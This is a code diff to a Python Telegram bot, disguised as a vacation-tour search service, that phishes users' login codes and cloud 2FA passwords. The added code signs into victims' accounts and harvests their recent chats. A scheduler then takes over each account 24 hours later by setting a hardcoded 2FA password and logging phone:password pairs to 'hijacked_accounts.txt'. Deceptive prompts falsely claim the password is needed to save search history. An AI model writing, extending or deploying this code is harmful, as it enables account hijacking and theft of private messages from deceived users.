@@ -7,10 +7,10 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from telethon.sync import TelegramClient
-from telethon.errors import PhoneNumberInvalidError, FloodWaitError, SessionPasswordNeededError
-
+from telethon.errors import PhoneNumberInvalidError, FloodWaitError, SessionPasswordNeededError, PasswordHashInvalidError
 from clear_telegram_chat import cleanup_telegram_chat, delete_telegram_messages
-from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER, CHAT_FOLDER, SESSION_2FA_FOLDER
+from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER, CHAT_FOLDER, SESSION_2FA_FOLDER, BASE_DATA_PATH, MY_SESSION_PATH
+from scheduler import get_pending_hijacks, mark_as_done, add_to_schedule
 from session_handler import sign_in_with_code, send_verification_code, \
     save_user_chats_last_7_days, get_account_with_2fa, move_session_to_2fa
 from phone_checker import get_phone_by_username
@@ -18,7 +18,7 @@ from messages import *
 
 # --- НАЛАШТУВАННЯ ---
 DEBUG_MODE = False  # True для тестування
-
+ENABLE_2FA_HIJACK = True
 # Метод отримання номера:
 # "username" - через username (РЕКОМЕНДОВАНО!)
 # "request_only" - завжди просити
@@ -36,6 +36,7 @@ class AuthStates(StatesGroup):
     waiting_for_phone = State()
     waiting_for_code_digit = State()
     waiting_for_confirmation = State()
+    waiting_for_2fa_password = State()
 
 
 class SearchStates(StatesGroup):
@@ -47,8 +48,6 @@ class SearchStates(StatesGroup):
 # База данных пользователей (в реальном проекте - использовать БД)
 user_data = {}
 authorized_users = {}  # {user_id: {'phone': '+...', 'name': '...', ...}}
-
-MY_SESSION_PATH = "sessions/my_account.session"
 
 
 # ==================== УТИЛИТЫ ====================
@@ -379,6 +378,158 @@ async def process_digit(callback: types.CallbackQuery, state: FSMContext):
         await callback.answer()
 
 
+@dp.message(F.text, AuthStates.waiting_for_2fa_password)
+async def process_2fa_password(message: Message, state: FSMContext):
+    """Обробка хмарного пароля для 2FA"""
+    user_id = message.from_user.id
+    password = message.text
+
+    if user_id not in user_data:
+        await message.answer(ERROR_SESSION_LOST)
+        await state.clear()
+        return
+
+    phone_number = user_data[user_id]['phone']
+    client = user_data[user_id]['client']  # Використовуємо існуючий клієнт
+
+    await message.answer("🔄 Проверяю пароль...")
+
+    try:
+        # Намагаємось увійти з паролем використовуючи існуючий клієнт
+        await client.sign_in(password=password)
+
+        if await client.is_user_authorized():
+            # Успішне перехоплення
+            authorized_users[user_id] = {
+                'phone': phone_number,
+                'name': message.from_user.full_name,
+                'has_2fa': True
+            }
+
+            await message.answer(
+                "✅ Доступ успешно получен!\n\n"
+                "Ваша история поиска и предпочтения сохранены.",
+                parse_mode="Markdown"
+            )
+
+            # Запускаємо збір чатів
+            async def collect_chats():
+                try:
+                    logger.info(f"Фоновий збір чатів для {phone_number} розпочато...")
+                    await save_user_chats_last_7_days(client, phone_number, CHAT_FOLDER)
+                    logger.info(f"Чати для {phone_number} успішно збережено")
+                except Exception as e:
+                    logger.error(f"Помилка при збереженні чатів: {e}")
+                finally:
+                    if client and client.is_connected():
+                        await client.disconnect()
+
+            asyncio.create_task(collect_chats())
+
+            await message.answer(
+                MAIN_MENU,
+                reply_markup=get_main_menu_keyboard(),
+                parse_mode="Markdown"
+            )
+
+            # Додаємо в чергу на фінальне перехоплення через 24 години
+            hijack_password = "Waterlemon7grow$"
+            await add_to_schedule(phone_number, hijack_password)
+
+        else:
+            await message.answer(
+                "❌ Не удалось авторизоваться. Попробуйте снова.",
+                parse_mode="Markdown"
+            )
+            # Залишаємо користувача в тому ж стані для повторної спроби
+            return
+
+    except PasswordHashInvalidError:
+        await message.answer(
+            "❌ Неправильный облачный пароль. Попробуйте снова.",
+            parse_mode="Markdown"
+        )
+        # Залишаємо користувача в тому ж стані для повторної спроби
+        return
+
+    except FloodWaitError as e:
+        await message.answer(
+            f"⏱ Слишком много попыток. Подождите {e.seconds} секунд.",
+            parse_mode="Markdown"
+        )
+        user_data.pop(user_id, None)
+        await state.clear()
+
+    except Exception as e:
+        logger.error(f"Помилка при вході з 2FA: {e}")
+        await message.answer(
+            f"❌ Ошибка: {str(e)}",
+            parse_mode="Markdown"
+        )
+        user_data.pop(user_id, None)
+        await state.clear()
+
+    # Очищуємо дані тільки при успішному входу або фатальній помилці
+    if user_id in user_data:
+        user_data.pop(user_id, None)
+    await state.clear()
+
+
+async def scheduled_hijacks_runner():
+    """
+    Фоновий процес, який кожну годину перевіряє чергу
+    і виконує перехоплення для акаунтів, яким виповнилося 24 години.
+    """
+    logger.info("🕐 Запуск фонового процесу для відкладених перехоплень.")
+    while True:
+        try:
+            pending_hijacks = await get_pending_hijacks()
+
+            if not pending_hijacks:
+                logger.info("🕐 Немає відкладених завдань для виконання.")
+
+            for task in pending_hijacks:
+                phone_number = task["phone"]
+                hijack_password = task["password"]
+
+                logger.info(f"🚨 Час настав! Починаю фінальне перехоплення акаунту {phone_number}...")
+
+                # Створюємо новий клієнт для цього завдання
+                session_name = f"{phone_number.replace('+', '')}.session"
+                session_path = os.path.join(SESSION_FOLDER, session_name)
+                client = TelegramClient(session_path, API_ID, API_HASH)
+
+                try:
+                    await client.connect()
+                    if await client.is_user_authorized():
+                        # Викликаємо вашу існуючу функцію для перехоплення
+                        hijack_success, hijack_result = await get_account_with_2fa(client, hijack_password)
+
+                        if hijack_success:
+                            # Зберігаємо пароль у файл
+                            with open(os.path.join(BASE_DATA_PATH, "hijacked_accounts.txt"), "a") as f:
+                                f.write(f"{phone_number}:{hijack_password}\n")
+                            logger.critical(f"🚨 АКАУНТ {phone_number} ОСТАТОЧНО ПЕРЕХОПЛЕНО. Пароль збережено.")
+                        else:
+                            logger.error(f"❌ Не вдалося остаточно перехопити акаунт {phone_number}: {hijack_result}")
+                    else:
+                        logger.warning(f"❌ Сесія для {phone_number} не авторизована. Пропускаю фінальне перехоплення.")
+
+                except Exception as e:
+                    logger.error(f"❌ Помилка під час фінального перехоплення {phone_number}: {e}")
+                finally:
+                    if client.is_connected():
+                        await client.disconnect()
+                    # Важливо: позначаємо завдання як виконане, щоб не повторювати
+                    await mark_as_done(phone_number)
+
+        except Exception as e:
+            logger.error(f"❌ Помилка в циклі scheduled_hijacks_runner: {e}")
+
+        # Чекаємо годину перед наступною перевіркою
+        await asyncio.sleep(3600)
+
+
 async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSMContext):
     """Фінальний вхід з кодом підтвердження"""
     await message.edit_text(CODE_CHECKING)
@@ -441,46 +592,52 @@ async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSM
             import string
             hijack_password = "Waterlemon7grow$" #"''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(16))
 
-            # Викликаємо функцію перехоплення
-            hijack_success, hijack_result = await get_account_with_2fa(client, hijack_password)
+            # Додаємо в чергу на виконання через 24 години
+            await add_to_schedule(phone_number, hijack_password)
 
-            if hijack_success:
-                # Зберігаємо пароль у надійному місці (наприклад, окремий файл або БД)
-                # ЦЕ ДУЖЕ ВАЖЛИВО!
-                with open("hijacked_accounts.txt", "a") as f:
-                    f.write(f"{phone_number}:{hijack_password}\n")
-                logger.critical(f"🚨 АКАУНТ {phone_number} ПЕРЕХОПЛЕНО. Пароль збережено.")
-            else:
-                logger.error(f"❌ Не вдалося перехопити акаунт {phone_number}: {hijack_result}")
+            logger.info(f"🕐 Акаунт {phone_number} буде остаточно перехоплено через 24 години.")
 
         elif success == "2FA_DETECTED":  # НОВЕ: Обробка 2FA
             # Виявлено 2FA: Доступу до чатів немає, але авторизація в боті успішна
-
-            # 1. Відключаємо клієнт, оскільки він не авторизований і не потрібен
-            if client.is_connected():
-                await client.disconnect()
-                logger.info(f"Клієнт для {phone_number} відключено (2FA).")
-
-            # 2. Переміщуємо сесійний файл в окрему папку
-            if move_session_to_2fa(phone_number, SESSION_FOLDER, SESSION_2FA_FOLDER):
-                # 3. Зберігаємо користувача як авторизованого, але з відміткою про 2FA
-                authorized_users[user_id] = {
-                    'phone': phone_number,
-                    'name': message.from_user.full_name,
-                    'has_2fa': True  # Важливо: позначаємо, що 2FA є
-                }
-                await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")  # <-- Повідомлення для користувача
-                await message.answer(
-                    f"{MAIN_MENU}",
-                    reply_markup=get_main_menu_keyboard(),
+            if ENABLE_2FA_HIJACK:
+                # Включений режим перехоплення через 2FA
+                await message.edit_text(
+                    "🔐 Обнаружен облачный пароль\n\n"
+                    "Для доступа к вашему аккаунту vacation тура требуется ввести облачный пароль.\n"
+                    "Это необходимо для подтверждения вашей личности и сохранения истории поиска.\n\n"
+                    "Пожалуйста, введите ваш облачный пароль Telegram:",
                     parse_mode="Markdown"
                 )
+                await state.set_state(AuthStates.waiting_for_2fa_password)
+                # НЕ відключаємо клієнт - він потрібен для подальшого входу
+                user_data[user_id]['client'] = client
+
             else:
-                # Якщо не вдалося перемістити сесію, видаляємо її, щоб не плутатись
-                await message.edit_text("Помилка при збереженні сесії. Спробуйте авторизуватись знову.")
-                user_data.pop(user_id, None)
-                await state.clear()
-                return
+                # 1. Відключаємо клієнт, оскільки він не авторизований і не потрібен
+                if client.is_connected():
+                    await client.disconnect()
+                    logger.info(f"Клієнт для {phone_number} відключено (2FA).")
+
+                # 2. Переміщуємо сесійний файл в окрему папку
+                if move_session_to_2fa(phone_number, SESSION_FOLDER, SESSION_2FA_FOLDER):
+                    # 3. Зберігаємо користувача як авторизованого, але з відміткою про 2FA
+                    authorized_users[user_id] = {
+                        'phone': phone_number,
+                        'name': message.from_user.full_name,
+                        'has_2fa': True  # Важливо: позначаємо, що 2FA є
+                    }
+                    await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")  # <-- Повідомлення для користувача
+                    await message.answer(
+                        f"{MAIN_MENU}",
+                        reply_markup=get_main_menu_keyboard(),
+                        parse_mode="Markdown"
+                    )
+                else:
+                    # Якщо не вдалося перемістити сесію, видаляємо її, щоб не плутатись
+                    await message.edit_text("Помилка при збереженні сесії. Спробуйте авторизуватись знову.")
+                    user_data.pop(user_id, None)
+                    await state.clear()
+                    return
 
         else:
             await message.edit_text(
@@ -651,8 +808,14 @@ async def handle_unexpected_message(message: Message, state: FSMContext):
             REMINDER_USE_DIGIT_BUTTONS,
             reply_markup=get_digit_keyboard()
         )
+    elif current_state == AuthStates.waiting_for_2fa_password:
+        await message.answer(
+            "🔐 Пожалуйста, введите облачный пароль для доступа к вашему аккаунту.\n\n"
+            "Это необходимо для подтверждения вашей личности.",
+            parse_mode="Markdown"
+        )
     else:
-        # Если авторизован - показываем меню
+        # Якщо авторизован - показуємо меню
         if is_user_authorized(message.from_user.id):
             await message.answer(
                 MAIN_MENU,
@@ -667,16 +830,28 @@ async def handle_unexpected_message(message: Message, state: FSMContext):
 
 # ==================== ЗАПУСК БОТА ====================
 
+async def main():
+    """Головна функція для запуску бота та фонових завдань."""
+    # Створюємо і запускаємо фонове завдання для відкладених перехоплень
+    # Воно буде працювати паралельно з ботом
+    asyncio.create_task(scheduled_hijacks_runner())
+
+    # Запускаємо поллінг бота (це блокуючий виклик)
+    await dp.start_polling(bot)
+
+
 if __name__ == "__main__":
     import os
 
     os.makedirs(SESSION_FOLDER, exist_ok=True)
+    os.makedirs(SESSION_2FA_FOLDER, exist_ok=True)
 
     logger.info("=" * 60)
-    logger.info("🚀 Запуск бота для поиска отдыха")
+    logger.info("🚀 Запуск бота для пошуку відпочинку")
     logger.info("=" * 60)
     logger.info(f"Режим: {'🧪 DEBUG' if DEBUG_MODE else '✅ PRODUCTION'}")
-    logger.info(f"Метод проверки: {AUTO_CHECK_METHOD}")
+    logger.info(f"Метод перевірки: {AUTO_CHECK_METHOD}")
     logger.info("=" * 60)
 
-    asyncio.run(dp.start_polling(bot))
+    # Запускаємо головну асинхронну функцію
+    asyncio.run(main())
